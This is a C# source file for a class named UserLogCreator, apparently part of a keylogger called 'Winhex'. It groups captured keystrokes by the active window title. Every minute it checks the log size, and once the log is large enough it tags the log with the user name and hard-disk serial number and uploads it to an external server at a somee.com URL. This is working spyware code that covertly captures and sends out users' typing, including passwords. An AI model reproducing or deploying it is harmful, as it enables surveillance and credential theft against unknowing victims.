using System;
using System.IO;
using System.Management;
using System.Runtime.Serialization.Formatters.Binary;
using System.Timers;
using Winhex.Interfaces;

namespace Winhex.Models
{
    public class UserLogCreator : ILogCreator
    {
        private UserAction _lastAction;
        private UserLog _currentUserLog;

        public UserLogCreator()
        {
            _currentUserLog = new UserLog();
            _lastAction = new UserAction();

            var mainTimer = new Timer(1 * 60 * 1000);
            mainTimer.Elapsed += MainTimer_Elapsed;
            mainTimer.Start();
        }

        public void AddKey(string appTitle, char key)
        {
            if (!appTitle.Equals(_lastAction.AppTitle))
            {
                if (_lastAction.TextLog.Length != 0)
                    _currentUserLog.Logs.Add(_lastAction);
                _lastAction = new UserAction() { ActionDateTime = DateTime.Now, AppTitle = appTitle };
            }

            _lastAction.TextLog += key;
        }

        private void MainTimer_Elapsed(object sender, ElapsedEventArgs e)
        {
            long size = 0;
            using (Stream stream = new MemoryStream())
            {
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(stream, _currentUserLog);
                size = stream.Length;
            }

            if (size > 1024)//0.1f * 1024 * 1024)
            {
                _currentUserLog.SendingDateTime = DateTime.Now;

                string serial = "";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
                foreach (ManagementObject hdd in searcher.Get())
                {
                    try
                    {
                        serial = hdd["SerialNumber"].ToString().Trim();
                    }
                    catch { }
                }
                _currentUserLog.CompName = Environment.UserName + "-" + serial;
                WebSender.SendToServer(_currentUserLog, "http://www.ihih.somee.com/upload");
                _currentUserLog = new UserLog();
            }
        }
    }
}